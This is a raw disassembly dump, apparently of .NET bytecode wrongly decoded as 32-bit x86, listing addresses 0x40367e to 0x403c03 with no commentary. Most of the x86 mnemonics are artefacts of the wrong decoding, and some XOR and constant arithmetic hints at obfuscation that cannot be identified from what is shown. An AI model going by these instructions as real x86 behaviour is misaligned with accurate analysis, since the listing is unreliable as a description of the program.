  40367e:	11 24 1d 11 09 5f 91 	adc    %esp,-0x6ea0f6ef(,%ebx,1)
  403685:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  403688:	1c 19                	sbb    $0x19,%al
  40368a:	62 11                	bound  %edx,(%ecx)
  40368c:	1c 1b                	sbb    $0x1b,%al
  40368e:	63 60 d2             	arpl   %esp,-0x2e(%eax)
  403691:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  403694:	05 11 09 11 05       	add    $0x5110911,%eax
  403699:	11 09                	adc    %ecx,(%ecx)
  40369b:	91                   	xchg   %eax,%ecx
  40369c:	11 1c 61             	adc    %ebx,(%ecx,%eiz,2)
  40369f:	d2 9c 17 11 09 58 13 	rcrb   %cl,0x13580911(%edi,%edx,1)
  4036a6:	09 11                	or     %edx,(%ecx)
  4036a8:	09 11                	or     %edx,(%ecx)
  4036aa:	07                   	pop    %es
  4036ab:	32 d1                	xor    %cl,%dl
  4036ad:	11 3b                	adc    %edi,(%ebx)
  4036af:	2d 0a 11 07 13       	sub    $0x1307110a,%eax
  4036b4:	1a 11                	sbb    (%ecx),%dl
  4036b6:	05 13 0d 2b 30       	add    $0x302b0d13,%eax
  4036bb:	11 05 18 91 11 05    	adc    %eax,0x5119118
  4036c1:	16                   	push   %ss
  4036c2:	91                   	xchg   %eax,%ecx
  4036c3:	1f                   	pop    %ds
  4036c4:	10 62 60             	adc    %ah,0x60(%edx)
  4036c7:	11 05 19 91 1e 62    	adc    %eax,0x621e9119
  4036cd:	60                   	pusha
  4036ce:	11 05 17 91 1f 18    	adc    %eax,0x181f9117
  4036d4:	62 60 13             	bound  %esp,0x13(%eax)
  4036d7:	1a 11                	sbb    (%ecx),%dl
  4036d9:	1a 8d 08 00 00 01    	sbb    0x1000008(%ebp),%cl
  4036df:	13 0d 11 05 1a 11    	adc    0x111a0511,%ecx
  4036e5:	0d 28 1e 00 00       	or     $0x1e28,%eax
  4036ea:	06                   	push   %es
  4036eb:	11 31                	adc    %esi,(%ecx)
  4036ed:	2c 38                	sub    $0x38,%al
  4036ef:	11 0a                	adc    %ecx,(%edx)
  4036f1:	11 17                	adc    %edx,(%edi)
  4036f3:	1f                   	pop    %ds
  4036f4:	0c 59                	or     $0x59,%al
  4036f6:	33 2f                	xor    (%edi),%ebp
  4036f8:	11 1a                	adc    %ebx,(%edx)
  4036fa:	8d 09                	lea    (%ecx),%ecx
  4036fc:	00 00                	add    %al,(%eax)
  4036fe:	01 13                	add    %edx,(%ebx)
  403700:	28 16                	sub    %dl,(%esi)
  403702:	13 0c 2b             	adc    (%ebx,%ebp,1),%ecx
  403705:	10 11                	adc    %dl,(%ecx)
  403707:	28 11                	sub    %dl,(%ecx)
  403709:	0c 11                	or     $0x11,%al
  40370b:	0d 11 0c 91 9d       	or     $0x9d910c11,%eax
  403710:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  403713:	58                   	pop    %eax
  403714:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403717:	0c 11                	or     $0x11,%al
  403719:	1a 32                	sbb    (%edx),%dh
  40371b:	ea 11 28 73 6b 00 00 	ljmp   $0x0,$0x6b732811
  403722:	0a 13                	or     (%ebx),%dl
  403724:	04 2b                	add    $0x2b,%al
  403726:	13 28                	adc    (%eax),%ebp
  403728:	6e                   	outsb  %ds:(%esi),(%dx)
  403729:	00 00                	add    %al,(%eax)
  40372b:	0a 11                	or     (%ecx),%dl
  40372d:	0d 16 11 0d 8e       	or     $0x8e0d1116,%eax
  403732:	69 6f 6f 00 00 0a 13 	imul   $0x130a0000,0x6f(%edi),%ebp
  403739:	04 11                	add    $0x11,%al
  40373b:	0a 20                	or     (%eax),%ah
  40373d:	3e 60                	ds pusha
  40373f:	df 3e                	fistpll (%esi)
  403741:	06                   	push   %es
  403742:	58                   	pop    %eax
  403743:	07                   	pop    %es
  403744:	61                   	popa
  403745:	11 0a                	adc    %ecx,(%edx)
  403747:	19 5f 58             	sbb    %ebx,0x58(%edi)
  40374a:	1b 62 58             	sbb    0x58(%edx),%esp
  40374d:	13 0a                	adc    (%edx),%ecx
  40374f:	11 0a                	adc    %ecx,(%edx)
  403751:	11 17                	adc    %edx,(%edi)
  403753:	1f                   	pop    %ds
  403754:	0c 59                	or     $0x59,%al
  403756:	20 ce                	and    %cl,%dh
  403758:	9f                   	lahf
  403759:	1e                   	push   %ds
  40375a:	3e 06                	ds push %es
  40375c:	61                   	popa
  40375d:	07                   	pop    %es
  40375e:	58                   	pop    %eax
  40375f:	11 17                	adc    %edx,(%edi)
  403761:	1f                   	pop    %ds
  403762:	0c 59                	or     $0x59,%al
  403764:	19 5f 58             	sbb    %ebx,0x58(%edi)
  403767:	1b 62 58             	sbb    0x58(%edx),%esp
  40376a:	2e 48                	cs dec %eax
  40376c:	11 07                	adc    %eax,(%edi)
  40376e:	02 58 20             	add    0x20(%eax),%bl
  403771:	27                   	daa
  403772:	ab                   	stos   %eax,%es:(%edi)
  403773:	ed                   	in     (%dx),%eax
  403774:	3e 06                	ds push %es
  403776:	58                   	pop    %eax
  403777:	07                   	pop    %es
  403778:	59                   	pop    %ecx
  403779:	61                   	popa
  40377a:	11 0a                	adc    %ecx,(%edx)
  40377c:	06                   	push   %es
  40377d:	20 5c 98 1e          	and    %bl,0x1e(%eax,%ebx,4)
  403781:	3e 61                	ds popa
  403783:	07                   	pop    %es
  403784:	58                   	pop    %eax
  403785:	5f                   	pop    %edi
  403786:	61                   	popa
  403787:	13 41 12             	adc    0x12(%ecx),%eax
  40378a:	41                   	inc    %ecx
  40378b:	73 44                	jae    0x4037d1
  40378d:	00 00                	add    %al,(%eax)
  40378f:	0a 13                	or     (%ebx),%dl
  403791:	06                   	push   %es
  403792:	20 e9                	and    %ch,%cl
  403794:	7c ee                	jl     0x403784
  403796:	cd 06                	int    $0x6
  403798:	59                   	pop    %ecx
  403799:	07                   	pop    %es
  40379a:	61                   	popa
  40379b:	0d 11 06 09 d2       	or     $0xd2090611,%eax
  4037a0:	28 46 00             	sub    %al,0x0(%esi)
  4037a3:	00 0a                	add    %cl,(%edx)
  4037a5:	26 11 06             	adc    %eax,%es:(%esi)
  4037a8:	28 69 00             	sub    %ch,0x0(%ecx)
  4037ab:	00 0a                	add    %cl,(%edx)
  4037ad:	28 70 00             	sub    %dh,0x0(%eax)
  4037b0:	00 0a                	add    %cl,(%edx)
  4037b2:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4037b5:	38 16                	cmp    %dl,(%esi)
  4037b7:	fe 01                	incb   (%ecx)
  4037b9:	03 5f 2c             	add    0x2c(%edi),%ebx
  4037bc:	68 11 04 28 71       	push   $0x71280411
  4037c1:	00 00                	add    %al,(%eax)
  4037c3:	0a 13                	or     (%ebx),%dl
  4037c5:	04 7e                	add    $0x7e,%al
  4037c7:	0c 00                	or     $0x0,%al
  4037c9:	00 04 02             	add    %al,(%edx,%eax,1)
  4037cc:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4037cf:	72 00                	jb     0x4037d1
  4037d1:	00 0a                	add    %cl,(%edx)
  4037d3:	7e 0c                	jle    0x4037e1
  4037d5:	00 00                	add    %al,(%eax)
  4037d7:	04 6f                	add    $0x6f,%al
  4037d9:	73 00                	jae    0x4037db
  4037db:	00 0a                	add    %cl,(%edx)
  4037dd:	1f                   	pop    %ds
  4037de:	3d 33 44 7e 0c       	cmp    $0xc7e4433,%eax
  4037e3:	00 00                	add    %al,(%eax)
  4037e5:	04 13                	add    $0x13,%al
  4037e7:	2d 16 13 33 11       	sub    $0x11331316,%eax
  4037ec:	2d 12 33 28 66       	sub    $0x66283312,%eax
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	0a 7e 0e             	or     0xe(%esi),%bh
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	04 2c                	add    $0x2c,%al
  4037fa:	1c 7e                	sbb    $0x7e,%al
  4037fc:	0e                   	push   %cs
  4037fd:	00 00                	add    %al,(%eax)
  4037ff:	04 6f                	add    $0x6f,%al
  403801:	25 00 00 06 14       	and    $0x14060000,%eax
  403806:	80 0e 00             	orb    $0x0,(%esi)
  403809:	00 04 14             	add    %al,(%esp,%edx,1)
  40380c:	80 0f 00             	orb    $0x0,(%edi)
  40380f:	00 04 14             	add    %al,(%esp,%edx,1)
  403812:	80 10 00             	adcb   $0x0,(%eax)
  403815:	00 04 de             	add    %al,(%esi,%ebx,8)
  403818:	0c 11                	or     $0x11,%al
  40381a:	33 2c 07             	xor    (%edi,%eax,1),%ebp
  40381d:	11 2d 28 6d 00 00    	adc    %ebp,0x6d28
  403823:	0a dc                	or     %ah,%bl
  403825:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403828:	11 3f                	adc    %edi,(%edi)
  40382a:	2a 00                	sub    (%eax),%al
  40382c:	41                   	inc    %ecx
  40382d:	4c                   	dec    %esp
  40382e:	00 00                	add    %al,(%eax)
  403830:	02 00                	add    (%eax),%al
  403832:	00 00                	add    %al,(%eax)
  403834:	0f 08                	invd
  403836:	00 00                	add    %al,(%eax)
  403838:	2e 00 00             	add    %al,%cs:(%eax)
  40383b:	00 3d 08 00 00 0c    	add    %bh,0xc000008
  403841:	00 00                	add    %al,(%eax)
  403843:	00 00                	add    %al,(%eax)
  403845:	00 00                	add    %al,(%eax)
  403847:	00 02                	add    %al,(%edx)
  403849:	00 00                	add    %al,(%eax)
  40384b:	00 13                	add    %dl,(%ebx)
  40384d:	03 00                	add    (%eax),%eax
  40384f:	00 29                	add    %ch,(%ecx)
  403851:	00 00                	add    %al,(%eax)
  403853:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  403856:	00 00                	add    %al,(%eax)
  403858:	0c 00                	or     $0x0,%al
  40385a:	00 00                	add    %al,(%eax)
  40385c:	00 00                	add    %al,(%eax)
  40385e:	00 00                	add    %al,(%eax)
  403860:	02 00                	add    (%eax),%al
  403862:	00 00                	add    %al,(%eax)
  403864:	2f                   	das
  403865:	00 00                	add    %al,(%eax)
  403867:	00 84 05 00 00 b3 05 	add    %al,0x5b30000(%ebp,%eax,1)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0c 00                	or     $0x0,%al
  403872:	00 00                	add    %al,(%eax)
  403874:	00 00                	add    %al,(%eax)
  403876:	00 00                	add    %al,(%eax)
  403878:	1b 30                	sbb    (%eax),%esi
  40387a:	01 00                	add    %eax,(%eax)
  40387c:	1a 00                	sbb    (%eax),%al
  40387e:	00 00                	add    %al,(%eax)
  403880:	0c 00                	or     $0x0,%al
  403882:	00 11                	add    %dl,(%ecx)
  403884:	02 6f 74             	add    0x74(%edi),%ch
  403887:	00 00                	add    %al,(%eax)
  403889:	0a 0a                	or     (%edx),%cl
  40388b:	de 0f                	fimuls (%edi)
  40388d:	26 02 6f 75          	add    %es:0x75(%edi),%ch
  403891:	00 00                	add    %al,(%eax)
  403893:	0a 73 76             	or     0x76(%ebx),%dh
  403896:	00 00                	add    %al,(%eax)
  403898:	0a 0a                	or     (%edx),%cl
  40389a:	de 00                	fiadds (%eax)
  40389c:	06                   	push   %es
  40389d:	2a 00                	sub    (%eax),%al
  40389f:	00 01                	add    %al,(%ecx)
  4038a1:	10 00                	adc    %al,(%eax)
  4038a3:	00 00                	add    %al,(%eax)
  4038a5:	00 00                	add    %al,(%eax)
  4038a7:	00 09                	add    %cl,(%ecx)
  4038a9:	09 00                	or     %eax,(%eax)
  4038ab:	0f 34                	sysenter
  4038ad:	00 00                	add    %al,(%eax)
  4038af:	01 13                	add    %edx,(%ebx)
  4038b1:	30 01                	xor    %al,(%ecx)
  4038b3:	00 12                	add    %dl,(%edx)
  4038b5:	00 00                	add    %al,(%eax)
  4038b7:	00 0d 00 00 11 02    	add    %cl,0x2110000
  4038bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4038be:	77 00                	ja     0x4038c0
  4038c0:	00 0a                	add    %cl,(%edx)
  4038c2:	0a 06                	or     (%esi),%al
  4038c4:	2c 06                	sub    $0x6,%al
  4038c6:	06                   	push   %es
  4038c7:	8e 2d 02 14 0a 06    	mov    0x60a1402,%gs
  4038cd:	2a 00                	sub    (%eax),%al
  4038cf:	00 13                	add    %dl,(%ebx)
  4038d1:	30 03                	xor    %al,(%ebx)
  4038d3:	00 bf 00 00 00 0e    	add    %bh,0xe000000(%edi)
  4038d9:	00 00                	add    %al,(%eax)
  4038db:	11 02                	adc    %eax,(%edx)
  4038dd:	03 17                	add    (%edi),%edx
  4038df:	58                   	pop    %eax
  4038e0:	25 fe 0b 01 00       	and    $0x10bfe,%eax
  4038e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e6:	5f                   	pop    %edi
  4038e7:	00 00                	add    %al,(%eax)
  4038e9:	0a 0a                	or     (%edx),%cl
  4038eb:	06                   	push   %es
  4038ec:	2d 03 14 2b 1e       	sub    $0x1e2b1403,%eax
  4038f1:	06                   	push   %es
  4038f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f3:	61                   	popa
  4038f4:	00 00                	add    %al,(%eax)
  4038f6:	0a 25 2d 04 26 14    	or     0x1426042d,%ah
  4038fc:	2b 11                	sub    (%ecx),%edx
  4038fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4038ff:	62 00                	bound  %eax,(%eax)
  403901:	00 0a                	add    %cl,(%edx)
  403903:	25 2d 04 26 14       	and    $0x1426042d,%eax
  403908:	2b 05 6f 78 00 00    	sub    0x786f,%eax
  40390e:	0a 0b                	or     (%ebx),%cl
  403910:	07                   	pop    %es
  403911:	14 28                	adc    $0x28,%al
  403913:	79 00                	jns    0x403915
  403915:	00 0a                	add    %cl,(%edx)
  403917:	2c 2d                	sub    $0x2d,%al
  403919:	07                   	pop    %es
  40391a:	28 1b                	sub    %bl,(%ebx)
  40391c:	00 00                	add    %al,(%eax)
  40391e:	06                   	push   %es
  40391f:	0c 08                	or     $0x8,%al
  403921:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403924:	00 06                	add    %al,(%esi)
  403926:	0d 09 2c 1c 09       	or     $0x91c2c09,%eax
  40392b:	8e 69 1e             	mov    0x1e(%ecx),%gs
  40392e:	33 16                	xor    (%esi),%edx
  403930:	09 16                	or     %edx,(%esi)
  403932:	91                   	xchg   %eax,%ecx
  403933:	20 b7 00 00 00 33    	and    %dh,0x33000000(%edi)
  403939:	0c 09                	or     $0x9,%al
  40393b:	1d 91 20 89 00       	sbb    $0x892091,%eax
  403940:	00 00                	add    %al,(%eax)
  403942:	33 02                	xor    (%edx),%eax
  403944:	17                   	pop    %ss
  403945:	2a 02                	sub    (%edx),%al
  403947:	03 17                	add    (%edi),%edx
  403949:	58                   	pop    %eax
  40394a:	25 fe 0b 01 00       	and    $0x10bfe,%eax
  40394f:	6f                   	outsl  %ds:(%esi),(%dx)
  403950:	5f                   	pop    %edi
  403951:	00 00                	add    %al,(%eax)
  403953:	0a 0a                	or     (%edx),%cl
  403955:	06                   	push   %es
  403956:	2c 41                	sub    $0x41,%al
  403958:	06                   	push   %es
  403959:	6f                   	outsl  %ds:(%esi),(%dx)
  40395a:	61                   	popa
  40395b:	00 00                	add    %al,(%eax)
  40395d:	0a 25 2d 04 26 14    	or     0x1426042d,%ah
  403963:	2b 11                	sub    (%ecx),%edx
  403965:	6f                   	outsl  %ds:(%esi),(%dx)
  403966:	62 00                	bound  %eax,(%eax)
  403968:	00 0a                	add    %cl,(%edx)
  40396a:	25 2d 04 26 14       	and    $0x1426042d,%eax
  40396f:	2b 05 6f 78 00 00    	sub    0x786f,%eax
  403975:	0a 0b                	or     (%ebx),%cl
  403977:	07                   	pop    %es
  403978:	14 28                	adc    $0x28,%al
  40397a:	79 00                	jns    0x40397c
  40397c:	00 0a                	add    %cl,(%edx)
  40397e:	2c c6                	sub    $0xc6,%al
  403980:	07                   	pop    %es
  403981:	d0 08                	rorb   $1,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	02 28                	add    (%eax),%ch
  403987:	63 00                	arpl   %eax,(%eax)
  403989:	00 0a                	add    %cl,(%edx)
  40398b:	6f                   	outsl  %ds:(%esi),(%dx)
  40398c:	78 00                	js     0x40398e
  40398e:	00 0a                	add    %cl,(%edx)
  403990:	28 7a 00             	sub    %bh,0x0(%edx)
  403993:	00 0a                	add    %cl,(%edx)
  403995:	2c af                	sub    $0xaf,%al
  403997:	17                   	pop    %ss
  403998:	2a 16                	sub    (%esi),%dl
  40399a:	2a 00                	sub    (%eax),%al
  40399c:	13 30                	adc    (%eax),%esi
  40399e:	06                   	push   %es
  40399f:	00 95 00 00 00 0f    	add    %dl,0xf000000(%ebp)
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	11 16                	adc    %edx,(%esi)
  4039a9:	0a 16                	or     (%esi),%dl
  4039ab:	0d 20 80 00 00       	or     $0x8020,%eax
  4039b0:	00 0b                	add    %cl,(%ebx)
  4039b2:	04 8e                	add    $0x8e,%al
  4039b4:	69 13 04 2b 7b 07    	imul   $0x77b2b04,(%ebx),%edx
  4039ba:	17                   	pop    %ss
  4039bb:	62 25 0b 20 00 01    	bound  %esp,0x100200b
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	33 0d 17 0b 02 03    	xor    0x3020b17,%ecx
  4039c9:	25 17 58 fe 0b       	and    $0xbfe5817,%eax
  4039ce:	01 00                	add    %eax,(%eax)
  4039d0:	91                   	xchg   %eax,%ecx
  4039d1:	0d 09 07 5f 2c       	or     $0x2c5f0709,%eax
  4039d6:	4c                   	dec    %esp
  4039d7:	02 03                	add    (%ebx),%al
  4039d9:	91                   	xchg   %eax,%ecx
  4039da:	18 63 19             	sbb    %ah,0x19(%ebx)
  4039dd:	58                   	pop    %eax
  4039de:	13 05 02 03 91 1e    	adc    0x1e910302,%eax
  4039e4:	62 02                	bound  %eax,(%edx)
  4039e6:	03 17                	add    (%edi),%edx
  4039e8:	58                   	pop    %eax
  4039e9:	91                   	xchg   %eax,%ecx
  4039ea:	60                   	pusha
  4039eb:	20 ff                	and    %bh,%bh
  4039ed:	03 00                	add    (%eax),%eax
  4039ef:	00 5f 13             	add    %bl,0x13(%edi)
  4039f2:	06                   	push   %es
  4039f3:	03 18                	add    (%eax),%ebx
  4039f5:	58                   	pop    %eax
  4039f6:	fe 0b                	decb   (%ebx)
  4039f8:	01 00                	add    %eax,(%eax)
  4039fa:	06                   	push   %es
  4039fb:	11 06                	adc    %eax,(%esi)
  4039fd:	59                   	pop    %ecx
  4039fe:	0c 08                	or     $0x8,%al
  403a00:	16                   	push   %ss
  403a01:	2f                   	das
  403a02:	0f 2a 04 06          	cvtpi2ps (%esi,%eax,1),%xmm0
  403a06:	25 17 58 0a 04       	and    $0x40a5817,%eax
  403a0b:	08 25 17 58 0c 91    	or     %ah,0x910c5817
  403a11:	9c                   	pushf
  403a12:	11 05 17 59 25 13    	adc    %eax,0x13255917
  403a18:	05 16 32 18 06       	add    $0x6183216,%eax
  403a1d:	11 04 32             	adc    %eax,(%edx,%esi,1)
  403a20:	e3 2b                	jecxz  0x403a4d
  403a22:	11 04 06             	adc    %eax,(%esi,%eax,1)
  403a25:	25 17 58 0a 02       	and    $0x20a5817,%eax
  403a2a:	03 25 17 58 fe 0b    	add    0xbfe5817,%esp
  403a30:	01 00                	add    %eax,(%eax)
  403a32:	91                   	xchg   %eax,%ecx
  403a33:	9c                   	pushf
  403a34:	06                   	push   %es
  403a35:	11 04 3f             	adc    %eax,(%edi,%edi,1)
  403a38:	7d ff                	jge    0x403a39
  403a3a:	ff                   	(bad)
  403a3b:	ff 2a                	ljmp   *(%edx)
  403a3d:	00 00                	add    %al,(%eax)
  403a3f:	00 6a 02             	add    %ch,0x2(%edx)
  403a42:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403a45:	00 0a                	add    %cl,(%edx)
  403a47:	02 03                	add    (%ebx),%al
  403a49:	7d 13                	jge    0x403a5e
  403a4b:	00 00                	add    %al,(%eax)
  403a4d:	04 02                	add    $0x2,%al
  403a4f:	1a 8d 08 00 00 01    	sbb    0x1000008(%ebp),%cl
  403a55:	7d 14                	jge    0x403a6b
  403a57:	00 00                	add    %al,(%eax)
  403a59:	04 2a                	add    $0x2a,%al
  403a5b:	00 1e                	add    %bl,(%esi)
  403a5d:	02 7b 13             	add    0x13(%ebx),%bh
  403a60:	00 00                	add    %al,(%eax)
  403a62:	04 2a                	add    $0x2a,%al
  403a64:	72 02                	jb     0x403a68
  403a66:	18 28                	sbb    %ch,(%eax)
  403a68:	24 00                	and    $0x0,%al
  403a6a:	00 06                	add    %al,(%esi)
  403a6c:	02 7b 14             	add    0x14(%ebx),%bh
  403a6f:	00 00                	add    %al,(%eax)
  403a71:	04 16                	add    $0x16,%al
  403a73:	91                   	xchg   %eax,%ecx
  403a74:	02 7b 14             	add    0x14(%ebx),%bh
  403a77:	00 00                	add    %al,(%eax)
  403a79:	04 17                	add    $0x17,%al
  403a7b:	91                   	xchg   %eax,%ecx
  403a7c:	1e                   	push   %ds
  403a7d:	62 60 68             	bound  %esp,0x68(%eax)
  403a80:	2a 00                	sub    (%eax),%al
  403a82:	00 00                	add    %al,(%eax)
  403a84:	ce                   	into
  403a85:	02 1a                	add    (%edx),%bl
  403a87:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403a8a:	00 06                	add    %al,(%esi)
  403a8c:	02 7b 14             	add    0x14(%ebx),%bh
  403a8f:	00 00                	add    %al,(%eax)
  403a91:	04 16                	add    $0x16,%al
  403a93:	91                   	xchg   %eax,%ecx
  403a94:	02 7b 14             	add    0x14(%ebx),%bh
  403a97:	00 00                	add    %al,(%eax)
  403a99:	04 17                	add    $0x17,%al
  403a9b:	91                   	xchg   %eax,%ecx
  403a9c:	1e                   	push   %ds
  403a9d:	62 60 02             	bound  %esp,0x2(%eax)
  403aa0:	7b 14                	jnp    0x403ab6
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	04 18                	add    $0x18,%al
  403aa6:	91                   	xchg   %eax,%ecx
  403aa7:	1f                   	pop    %ds
  403aa8:	10 62 60             	adc    %ah,0x60(%edx)
  403aab:	02 7b 14             	add    0x14(%ebx),%bh
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	04 19                	add    $0x19,%al
  403ab2:	91                   	xchg   %eax,%ecx
  403ab3:	1f                   	pop    %ds
  403ab4:	18 62 60             	sbb    %ah,0x60(%edx)
  403ab7:	2a 1a                	sub    (%edx),%bl
  403ab9:	73 7b                	jae    0x403b36
  403abb:	00 00                	add    %al,(%eax)
  403abd:	0a 7a 00             	or     0x0(%edx),%bh
  403ac0:	13 30                	adc    (%eax),%esi
  403ac2:	05 00 4f 00 00       	add    $0x4f00,%eax
  403ac7:	00 10                	add    %dl,(%eax)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	11 16                	adc    %edx,(%esi)
  403acd:	0a 16                	or     (%esi),%dl
  403acf:	0b 03                	or     (%ebx),%eax
  403ad1:	17                   	pop    %ss
  403ad2:	33 20                	xor    (%eax),%esp
  403ad4:	02 7b 13             	add    0x13(%ebx),%bh
  403ad7:	00 00                	add    %al,(%eax)
  403ad9:	04 6f                	add    $0x6f,%al
  403adb:	7c 00                	jl     0x403add
  403add:	00 0a                	add    %cl,(%edx)
  403adf:	0b 07                	or     (%edi),%eax
  403ae1:	15 33 05 28 23       	adc    $0x23280533,%eax
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	06                   	push   %es
  403ae9:	02 7b 14             	add    0x14(%ebx),%bh
  403aec:	00 00                	add    %al,(%eax)
  403aee:	04 16                	add    $0x16,%al
  403af0:	07                   	pop    %es
  403af1:	d2 9c 2a 02 7b 13 00 	rcrb   %cl,0x137b02(%edx,%ebp,1)
  403af8:	00 04 02             	add    %al,(%edx,%eax,1)
  403afb:	7b 14                	jnp    0x403b11
  403afd:	00 00                	add    %al,(%eax)
  403aff:	04 06                	add    $0x6,%al
  403b01:	03 06                	add    (%esi),%eax
  403b03:	59                   	pop    %ecx
  403b04:	6f                   	outsl  %ds:(%esi),(%dx)
  403b05:	7d 00                	jge    0x403b07
  403b07:	00 0a                	add    %cl,(%edx)
  403b09:	0b 07                	or     (%edi),%eax
  403b0b:	2d 05 28 23 00       	sub    $0x232805,%eax
  403b10:	00 06                	add    %al,(%esi)
  403b12:	06                   	push   %es
  403b13:	07                   	pop    %es
  403b14:	58                   	pop    %eax
  403b15:	0a 06                	or     (%esi),%al
  403b17:	03 32                	add    (%edx),%esi
  403b19:	da 2a                	fisubrl (%edx)
  403b1b:	00 13                	add    %dl,(%ebx)
  403b1d:	30 02                	xor    %al,(%edx)
  403b1f:	00 1f                	add    %bl,(%edi)
  403b21:	00 00                	add    %al,(%eax)
  403b23:	00 11                	add    %dl,(%ecx)
  403b25:	00 00                	add    %al,(%eax)
  403b27:	11 02                	adc    %eax,(%edx)
  403b29:	7b 13                	jnp    0x403b3e
  403b2b:	00 00                	add    %al,(%eax)
  403b2d:	04 0a                	add    $0xa,%al
  403b2f:	02 14 7d 13 00 00 04 	add    0x4000013(,%edi,2),%dl
  403b36:	06                   	push   %es
  403b37:	2c 06                	sub    $0x6,%al
  403b39:	06                   	push   %es
  403b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b3b:	7e 00                	jle    0x403b3d
  403b3d:	00 0a                	add    %cl,(%edx)
  403b3f:	02 14 7d 14 00 00 04 	add    0x4000014(,%edi,2),%dl
  403b46:	2a 00                	sub    (%eax),%al
  403b48:	13 30                	adc    (%eax),%esi
  403b4a:	05 00 4f 00 00       	add    $0x4f00,%eax
  403b4f:	00 12                	add    %dl,(%edx)
  403b51:	00 00                	add    %al,(%eax)
  403b53:	11 03                	adc    %eax,(%ebx)
  403b55:	16                   	push   %ss
  403b56:	2f                   	das
  403b57:	06                   	push   %es
  403b58:	73 7f                	jae    0x403bd9
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	0a 7a 03             	or     0x3(%edx),%bh
  403b5f:	8d 08                	lea    (%eax),%ecx
  403b61:	00 00                	add    %al,(%eax)
  403b63:	01 0a                	add    %ecx,(%edx)
  403b65:	16                   	push   %ss
  403b66:	0b 02                	or     (%edx),%eax
  403b68:	7b 13                	jnp    0x403b7d
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	04 06                	add    $0x6,%al
  403b6e:	07                   	pop    %es
  403b6f:	03 6f 7d             	add    0x7d(%edi),%ebp
  403b72:	00 00                	add    %al,(%eax)
  403b74:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403b77:	2c 0f                	sub    $0xf,%al
  403b79:	07                   	pop    %es
  403b7a:	08 58 0b             	or     %bl,0xb(%eax)
  403b7d:	03 08                	add    (%eax),%ecx
  403b7f:	59                   	pop    %ecx
  403b80:	fe 0b                	decb   (%ebx)
  403b82:	01 00                	add    %eax,(%eax)
  403b84:	03 16                	add    (%esi),%edx
  403b86:	30 df                	xor    %bl,%bh
  403b88:	07                   	pop    %es
  403b89:	06                   	push   %es
  403b8a:	8e 69 2e             	mov    0x2e(%ecx),%gs
  403b8d:	13 07                	adc    (%edi),%eax
  403b8f:	8d 08                	lea    (%eax),%ecx
  403b91:	00 00                	add    %al,(%eax)
  403b93:	01 0d 06 16 09 16    	add    %ecx,0x16091606
  403b99:	07                   	pop    %es
  403b9a:	28 80 00 00 0a 09    	sub    %al,0x90a0000(%eax)
  403ba0:	0a 06                	or     (%esi),%al
  403ba2:	2a 00                	sub    (%eax),%al
  403ba4:	13 30                	adc    (%eax),%esi
  403ba6:	03 00                	add    (%eax),%eax
  403ba8:	39 00                	cmp    %eax,(%eax)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	13 00                	adc    (%eax),%eax
  403bae:	00 11                	add    %dl,(%ecx)
  403bb0:	14 0a                	adc    $0xa,%al
  403bb2:	04 0b                	add    $0xb,%al
  403bb4:	05 2c 12 05 17       	add    $0x1705122c,%eax
  403bb9:	33 1a                	xor    (%edx),%ebx
  403bbb:	7e 81                	jle    0x403b3e
  403bbd:	00 00                	add    %al,(%eax)
  403bbf:	0a 02                	or     (%edx),%al
  403bc1:	6f                   	outsl  %ds:(%esi),(%dx)
  403bc2:	82 00 00             	addb   $0x0,(%eax)
  403bc5:	0a 0a                	or     (%edx),%cl
  403bc7:	2b 0c 7e             	sub    (%esi,%edi,2),%ecx
  403bca:	83 00 00             	addl   $0x0,(%eax)
  403bcd:	0a 02                	or     (%edx),%al
  403bcf:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd0:	82 00 00             	addb   $0x0,(%eax)
  403bd3:	0a 0a                	or     (%edx),%cl
  403bd5:	06                   	push   %es
  403bd6:	2c 0f                	sub    $0xf,%al
  403bd8:	06                   	push   %es
  403bd9:	03 04 6f             	add    (%edi,%ebp,2),%eax
  403bdc:	84 00                	test   %al,(%eax)
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	0b 06                	or     (%esi),%eax
  403be2:	6f                   	outsl  %ds:(%esi),(%dx)
  403be3:	85 00                	test   %eax,(%eax)
  403be5:	00 0a                	add    %cl,(%edx)
  403be7:	07                   	pop    %es
  403be8:	2a 00                	sub    (%eax),%al
  403bea:	00 00                	add    %al,(%eax)
  403bec:	1b 30                	sbb    (%eax),%esi
  403bee:	04 00                	add    $0x0,%al
  403bf0:	49                   	dec    %ecx
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403bf6:	00 11                	add    %dl,(%ecx)
  403bf8:	14 0a                	adc    $0xa,%al
  403bfa:	17                   	pop    %ss
  403bfb:	0b 0e                	or     (%esi),%ecx
  403bfd:	04 2c                	add    $0x2c,%al
  403bff:	13 0e                	adc    (%esi),%ecx
  403c01:	04 17                	add    $0x17,%al
  403c03:	33 1a                	xor    (%edx),%ebx
